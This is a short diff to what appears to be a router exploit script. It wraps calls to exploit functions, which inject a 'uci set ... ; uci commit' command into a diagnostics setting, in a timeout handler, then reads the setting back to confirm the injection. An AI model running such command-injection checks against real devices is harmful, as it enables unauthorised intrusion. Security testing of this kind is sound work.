@@ -61,9 +61,13 @@ vuln_test_num = 82000011
 exec_cmd = None
 exp_list = [ exploit_2, exploit_1 ]
 for exp_func in exp_list:
-    res = exp_func(f"uci set diag.config.iperf_test_thr={vuln_test_num} ; uci commit diag")
-    #if '"code":0' not in res:
-    #    continue
+    try:
+        res = exp_func(f"uci set diag.config.iperf_test_thr={vuln_test_num} ; uci commit diag")
+        #if '"code":0' not in res:
+        #    continue
+    except requests.exceptions.ReadTimeout:
+        time.sleep(1)
+        continue
     time.sleep(0.5)
     iperf_test_thr = gw.get_diag_iperf_test_thr()
     if iperf_test_thr == str(vuln_test_num):
